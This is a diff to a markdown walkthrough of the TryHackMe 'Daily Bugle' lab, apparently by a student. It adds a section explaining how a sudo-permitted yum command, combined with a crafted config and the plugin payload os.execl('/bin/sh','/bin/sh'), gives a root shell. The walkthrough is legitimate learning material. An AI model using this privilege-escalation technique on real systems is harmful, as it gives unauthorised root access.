@@ -266,6 +266,9 @@ sudo yum -c $TF/x --enableplugin=y
 ```
 If you have entered the commands correctly then you will now be a root user!<br />
 ![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Daily_Bugle/screenshots/SCREENSHOT32.png?raw=true)<br />
+
+### Collecting the last flag
+
 Let's get the last flag and complete this room/box.
 ```shell
 cd /root
@@ -273,6 +276,33 @@ ls
 cat root.txt
 ```
 ![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Daily_Bugle/screenshots/SCREENSHOT33.png?raw=true)<br />
+
+### Extra Learning
+
+This privilege escalation technique makes use of the user privilege to run yum as sudo.<br />
+```TF=$(mktemp -d)``` creates a temporary directory.
+
+Afterwards, three files are created inside the temp directory by "catting" content into them.
+
+To visualize this, you can run the following commands in a bash shell (without leading > of course):
+
+> touch test
+
+> cat >test<<EOF 
+[main]
+plugins=1
+pluginpath=$TF
+pluginconfpath=$TF
+EOF
+
+> cat test
+
+This will print out the just "catted" content inside the file called test.
+
+The last step: sudo yum -c $TF/x --enableplugin=y simply executes a regular yum command, making use of the just created files mentioned above. The payload def init_hook(conduit): os.execl('/bin/sh','/bin/sh') will then be executed giving you a shell as root since you execute it with sudo.
+
+I hope this is helpful.
+
 
 ## Questions & Answers
 
